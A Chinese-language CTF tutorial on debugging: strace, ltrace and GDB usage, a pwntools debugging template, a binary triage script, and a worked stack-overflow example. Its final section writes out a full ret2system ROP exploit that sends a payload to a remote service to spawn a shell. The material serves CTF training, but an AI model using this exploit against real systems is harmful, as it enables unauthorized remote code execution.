# 调试与故障排除方法论

## 1. 概述

在CTF解题过程中，无论是自己写的Exp脚本出现问题，还是需要分析目标程序的运行行为，调试能力都是核心竞争力。断网环境下无法查阅StackOverflow，必须掌握系统的调试方法论和工具使用。

### 调试层次模型

```
第一层：日志/输出分析
   - 增加print/日志点，观察变量状态
   - 检查程序的标准输出/标准错误
   - 最适合：脚本问题、逻辑错误

第二层：系统调用追踪
   - strace：追踪系统调用（文件、网络、进程）
   - ltrace：追踪库函数调用（libc函数）
   - 最适合：程序行为异常、文件/网络访问问题

第三层：交互式调试器
   - gdb：二进制调试
   - pdb/ipdb：Python调试
   - 最适合：逻辑Bug、内存问题、可利用性验证

第四层：动态分析
   - 内存dump分析
   - 寄存器/栈检查
   - 最适合：内存损坏、堆溢出、UAF等深层问题
```

## 2. 核心原理

### 2.1 strace原理与信号流

strace通过ptrace系统调用来拦截目标进程的每个系统调用：

```
[目标程序]  ──syscall──>  [内核]
                ↑
           ptrace拦截
                ↑
            [strace]
              │
              v
          显示syscall名称和参数
```

关键系统调用CTF关注点：
- `open/openat`：文件访问路径（读取了什么文件？flag.txt?）
- `read/write`：数据传输（发送了什么数据？）
- `execve`：进程创建（启动了shell吗？）
- `socket/connect`：网络连接（连接了哪个地址？）
- `mmap/mprotect`：内存映射和保护修改（shellcode执行？）
- `ptrace`：反调试检测

### 2.2 ltrace原理

ltrace通过LD_PRELOAD或ptrace拦截动态链接的库函数调用：

```
[目标程序]  ──libc函数──>  [libc.so]
                ↑
            LD_PRELOAD或ptrace拦截
                ↑
            [ltrace]
              │
              v
          显示库函数名称和参数
```

CTF关键监控函数：
- `strcpy/strcat/sprintf`：字符串操作（缓冲区溢出？）
- `malloc/free/realloc`：内存分配（堆操作模式）
- `system/popen/exec*`：命令执行（RCE漏洞利用）
- `fopen/fread/fwrite`：文件操作
- `printf/fprintf`：格式化字符串漏洞

### 2.3 GDB核心原理

GDB通过ptrace进行进程控制：
```
GDB --> ptrace(PTRACE_ATTACH, pid) --> 目标进程暂停
GDB --> ptrace(PTRACE_PEEKDATA, addr) --> 读取目标内存
GDB --> ptrace(PTRACE_POKEDATA, addr) --> 修改目标内存
GDB --> ptrace(PTRACE_CONT, pid) --> 目标进程继续运行
```

## 3. 关键技巧/检测方法

### 3.1 strace实战技巧

```bash
# ===== 基础用法 =====
strace ./program                              # 追踪所有系统调用
strace -c ./program                           # 统计系统调用次数和时间
strace -o output.txt ./program                # 输出到文件
strace -p <pid>                               # 附加到运行中的进程

# ===== 过滤特定系统调用 =====
strace -e trace=open,read,write ./program     # 只追踪文件和I/O
strace -e trace=file ./program                # 所有文件相关调用
strace -e trace=network ./program             # 所有网络相关调用
strace -e trace=process ./program             # 所有进程相关调用
strace -e trace=signal ./program              # 所有信号相关调用

# ===== CTF最常用场景 =====
# 1. 查看程序打开了哪些文件（找flag读取路径）
strace -e trace=open,openat ./readflag 2>&1 | grep -E 'open|flag'

# 2. 查看程序网络通信（检查是否连接到外部）
strace -e trace=network ./challenge

# 3. 查看execve调用（是否启动了shell/其他进程）
strace -f -e trace=execve ./challenge

# 4. 追踪子进程（-f 追踪fork出来的子进程）
strace -f ./program 2>&1 | grep -E 'execve|open'

# 5. 显示系统调用详细信息（-v verbose）
strace -v -e trace=read,write ./program

# 6. 显示时间戳（性能分析）
strace -tt -T ./program    # -tt: 微秒时间戳, -T: 每次调用耗时

# 7. 追踪信号
strace -e trace=signal ./program

# ===== 高级过滤 =====
# 只显示失败的调用
strace -e trace=open -Z ./program

# 显示字符串参数的内容（默认截断，-s指定长度）
strace -s 200 -e trace=write ./program

# 追踪特定路径的访问
strace -e trace=file ./program 2>&1 | grep '/flag'
```

### 3.4 pwntools+GDB调试模板

```python
#!/usr/bin/env python3
"""
gdb_pwn_debug.py - Pwn调试模板
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# ===== 创建GDB脚本 =====
gdb_script = '''
# 设置断点
break *main
break *0x401234
break *read+0

# 断点命令（达到断点时自动执行）
commands 1
    printf "RSP: %p\\n", $rsp
    x/10gx $rsp
    continue
end

# 定义自定义命令
define hook-stop
    printf "--- Stopped at %p ---\\n", $rip
    x/5i $rip
end

# 在ret指令设断点
# rbreak 可以按正则匹配函数名设断点
# info breakpoints 查看所有断点
'''

# ===== 方式1: 直接在GDB中启动 =====
def debug_with_gdb():
    p = gdb.debug(
        './challenge',
        gdbscript=gdb_script,
        env={'LD_PRELOAD': './libc.so.6'}
    )
    
    # 发送Payload
    payload = cyclic(200)
    p.sendline(payload)
    
    # 检查崩溃
    p.wait()
    core = p.corefile
    if core:
        # 从core dump中获取信息
        rip_value = core.rip
        rsp_value = core.rsp
        log.info(f'RIP: {hex(rip_value)}')
        log.info(f'RSP: {hex(rsp_value)}')
        
        # 计算偏移
        offset = cyclic_find(rip_value)
        log.info(f'Offset to RIP: {offset}')
    
    p.interactive()

# ===== 方式2: 附加到运行中的进程 =====
def attach_to_process():
    p = process('./challenge')
    
    # 先让程序运行到某个点
    p.recvuntil(b'Enter input: ')
    
    # 附加GDB
    gdb.attach(p, gdbscript='''
        break *0x401234
        continue
    ''')
    
    # 继续交互
    p.sendline(b'AAAA')
    p.interactive()

# ===== 方式3: 远程GDB（调试远程目标） =====
def remote_debug():
    # 在目标机器上: gdbserver :1234 ./challenge
    # 在本地:
    # gdb -q ./challenge
    # target remote target_ip:1234

    # 使用pwntools
    p = remote('10.10.10.10', 9999)
    
    # 如果是远程GDB Server
    # context.os = 'linux'
    # context.arch = 'amd64'
    # gdb.attach(('target_ip', 1234), gdbscript='continue')

# ===== 调试工具函数 =====
def find_crash_offset(binary_path: str, input_generator):
    """使用循环模式自动定位崩溃偏移"""
    
    # 方法1: 循环模式
    pattern = cyclic(500)
    p = process(binary_path)
    p.sendline(pattern)
    p.wait()
    
    core = p.corefile
    if core:
        # 在x86-64上，溢出会覆盖RIP
        if context.arch == 'amd64':
            offset = cyclic_find(core.rip)
        else:
            offset = cyclic_find(core.eip)
        log.info(f'Crash offset: {offset}')
        return offset
    
    return None

def check_protections(binary_path: str):
    """检查二进制文件的保护机制"""
    elf = ELF(binary_path)
    
    protections = {
        'Arch': elf.arch,
        'RELRO': 'Full' if elf.relro else ('Partial' if elf.partial_relro else 'None'),
        'Stack Canary': 'Yes' if elf.canary else 'No',
        'NX': 'Yes' if elf.nx else 'No',
        'PIE': 'Yes' if elf.pie else 'No',
    }
    
    for k, v in protections.items():
        status = '[-]' if v == 'Yes' else '[+]' if v == 'No' else '[*]'
        print(f'{status} {k}: {v}')
    
    return protections

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        check_protections(sys.argv[1])
    else:
        print('Usage: python3 gdb_pwn_debug.py <binary>')
```

### 3.6 二进制文件快速分析脚本

```bash
#!/bin/bash
# binary_analysis.sh - 二进制文件快速分析

BINARY="$1"
OUTDIR="analysis_$(basename "$BINARY")"

if [ -z "$BINARY" ]; then
    echo "用法: $0 <binary_file>"
    exit 1
fi

mkdir -p "$OUTDIR"

echo "=== 二进制文件分析: $BINARY ==="

# 1. 文件类型
echo -e "\n--- file ---"
file "$BINARY" | tee "${OUTDIR}/file.txt"

# 2. 安全机制
echo -e "\n--- checksec ---"
checksec --file="$BINARY" 2>/dev/null | tee "${OUTDIR}/checksec.txt"

# 3. 字符串
echo -e "\n--- 搜索flag相关字符串 ---"
strings "$BINARY" | grep -iE 'flag|ctf|password|secret|key' | tee "${OUTDIR}/interesting_strings.txt"

# 4. 可打印字符串
echo -e "\n--- 提取所有字符串 (min 8 chars) ---"
strings -n 8 "$BINARY" > "${OUTDIR}/all_strings.txt"
echo "共 $(wc -l < ${OUTDIR}/all_strings.txt) 个字符串"

# 5. 函数列表
echo -e "\n--- 函数列表 ---"
nm "$BINARY" 2>/dev/null | grep -i ' T ' | tee "${OUTDIR}/functions.txt"
echo "共 $(wc -l < ${OUTDIR}/functions.txt) 个函数"

# 6. 动态库依赖
echo -e "\n--- 动态链接库 ---"
ldd "$BINARY" 2>/dev/null | tee "${OUTDIR}/ldd.txt"

# 7. 段信息
echo -e "\n--- ELF段信息 ---"
readelf -S "$BINARY" 2>/dev/null | tee "${OUTDIR}/sections.txt"

# 8. 符号表
echo -e "\n--- 动态符号表 ---"
readelf --dyn-syms "$BINARY" 2>/dev/null | tee "${OUTDIR}/dynsyms.txt"

# 9. GOT/PLT
echo -e "\n--- GOT/PLT信息 ---"
objdump -R "$BINARY" 2>/dev/null | tee "${OUTDIR}/relocations.txt"

# 10. ROP Gadgets
echo -e "\n--- ROP Gadgets搜索 ---"
ROPgadget --binary "$BINARY" 2>/dev/null | tee "${OUTDIR}/ropgadgets.txt"
echo "共 $(wc -l < ${OUTDIR}/ropgadgets.txt) 个gadgets"

# 11. 反汇编
echo -e "\n--- 反汇编（仅.text段）---"
objdump -d -M intel "$BINARY" 2>/dev/null > "${OUTDIR}/disasm.txt"
echo "反汇编已保存"

echo -e "\n[+] 分析完成！结果保存在: $OUTDIR"
```

## 4. 常见误区与注意事项

### 4.1 调试误区

| 误区 | 正确做法 |
|------|----------|
| 直接用GDB而无目的 | 先分析保护机制，确定策略，再开GDB |
| 忽略core dump | `ulimit -c unlimited` 启用core dump，崩溃后分析 |
| strace输出太多无从下手 | 使用`-e trace=`过滤特定系统调用 |
| 在递归函数中单步执行 | 使用条件断点或`finish`跳出 |
| 调试时直接修改关键寄存器但不理解原因 | 先理解为什么，再修改 |
| 忘记检查ASLR状态 | `cat /proc/sys/kernel/randomize_va_space` |
| 在Python中混淆bytes和str | 打印`type(x)`确认类型 |
| 忽略编码问题 | Python打开文件时明确指定`encoding='utf-8'` |

### 4.2 断网环境调试限制与对策

| 限制 | 对策 |
|------|------|
| 无法Google错误信息 | 准备本地Python/GDB错误信息速查文档 |
| 缺少在线调试教程 | 预存GDB/pdb常用命令速查卡 |
| 版本特定API变化 | 预装多个Python版本的虚拟环境 |
| 符号缺失（stripped binary） | 使用FLIRT签名识别或手动逆向分析 |

### 示例2：使用GDB分析Pwn崩溃并构造Exp

**场景**：一个栈溢出导致程序崩溃，需要找到偏移并利用。

```bash
# Step 1: 基本信息收集
file challenge
checksec --file=challenge
# Arch: amd64-64-little
# RELRO: Partial RELRO
# Stack: No canary found   <-- 好消息！没有canary
# NX: NX enabled           <-- 不能直接执行shellcode
# PIE: No PIE              <-- 地址固定！

# Step 2: 用循环模式定位偏移
python3 -c "
from pwn import *
pattern = cyclic(200)
print(pattern.decode())
" > pattern.txt

gdb -q ./challenge
(gdb) run < pattern.txt
# Program received signal SIGSEGV, Segmentation fault.
# 0x0000000000401234 in vulnerable_function ()
(gdb) info registers rip
# rip: 0x626161696261616a

# Step 3: 计算偏移
python3 -c "
from pwn import *
offset = cyclic_find(0x626161696261616a)
print(f'Offset: {offset}')
"
# Offset: 40

# Step 4: 验证偏移
python3 -c "
from pwn import *
payload = b'A' * 40 + b'BBBBBBBB'
print(payload.hex())
" | ./challenge
# GDB中: rip = 0x4242424242424242, 确认偏移=40

# Step 5: 构造完整Exp
python3 << 'EOF'
from pwn import *

context.arch = 'amd64'

# 加载二进制
elf = ELF('./challenge')

# 查找gadget和函数
pop_rdi = 0x4012a3  # ROPgadget找到
system_plt = elf.plt['system']
binsh = next(elf.search(b'/bin/sh'))
ret = 0x40101a  # ret gadget用于栈对齐

# 构造Payload
payload = b'A' * 40
payload += p64(ret)      # 栈对齐
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(binsh)    # "/bin/sh"
payload += p64(system_plt)

# 发送
p = remote('10.10.10.10', 9999)
p.sendline(payload)
p.interactive()
EOF
```
